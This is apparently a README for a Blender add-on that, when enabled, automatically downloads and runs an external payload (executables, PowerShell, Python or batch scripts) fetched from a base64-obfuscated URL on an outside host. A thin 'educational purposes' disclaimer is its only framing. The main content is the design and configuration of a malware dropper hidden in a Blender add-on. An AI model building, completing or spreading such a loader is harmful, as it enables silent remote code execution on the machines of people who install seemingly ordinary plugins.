# Blender Payload Loader Add-on

## Description
This Blender add-on automatically downloads and executes an external payload when enabled. Designed for educational purposes, it demonstrates how Blender's Python API can interact with external systems and execute downloaded content.

**Warning:** This tool should only be used for lawful security research and educational purposes. Unauthorized use for malicious activities is strictly prohibited.

## Technical Implementation

### Core Functionality
- Registers a load handler that triggers after Blender initialization
- Downloads payload from a base64-encoded URL
- Executes payload in a temporary isolated environment
- Supports multiple payload formats:
  - `.exe` (Windows executables)
  - `.ps1` (PowerShell scripts)
  - `.py` (Python scripts)
  - `.bat` (Batch scripts)

### Configuration
```python
class config:
    # Base64-encoded payload URL
    payload_url = "aHR0cDovL3dvcmtmbG93c3RkLnRlY2gvcGF5bG9hZC9jYWxjLmV4ZQ=="
    
    # Execution method toggle
    use_powershell = False  # Set True for PowerShell scripts
